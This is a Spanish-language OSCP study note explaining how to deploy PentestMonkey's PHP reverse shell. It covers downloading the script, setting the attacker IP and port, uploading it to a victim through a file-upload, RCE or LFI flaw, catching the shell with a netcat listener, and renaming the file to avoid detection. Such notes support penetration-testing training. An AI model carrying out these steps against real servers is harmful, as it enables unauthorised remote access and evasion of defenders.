`php-reverse-shell.php` es un script clásico de PentestMonkey que te da una shell reversa cuando se ejecuta desde un servidor web vulnerable (por ejemplo, subida de archivos sin validación). En OSCP es útil cuando consigues ejecutar código en un entorno web PHP.

---

## Obtención del Script

Descargar desde el repositorio oficial:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

---

## Edición del Script

Abre el archivo y edita estas líneas:
```php
$ip = '10.11.0.1';  // tu IP atacante
$port = 4444;       // puerto donde escucharás
```

Guarda los cambios.

---

## Subida y ejecución

1. Sube el archivo a la víctima (por panel vulnerable, RCE, LFI, etc.)
2. Accede a la ruta web del archivo:
```
http://<victima>/uploads/php-reverse-shell.php
```

---

## Escuchar desde Kali

```bash
rlwrap nc -lvnp 4444
```

Cuando accedas a la URL, la shell se conectará a tu listener y obtendrás acceso remoto.

---

## Casos de Uso OSCP

- Vulnerabilidades de subida de ficheros
- Webshells que permiten ejecución
- LFI + log poisoning (si logueas la shell y luego haces LFI sobre el log)

---

## Buenas Prácticas

- Renombra el archivo tras la subida para evitar detección (`report.php`, `config.php`, etc.)
- Usa `rlwrap` para tener historial y edición de línea
- Combina con estabilización (`python -c`, `script -c`, etc.) tras obtener acceso

---
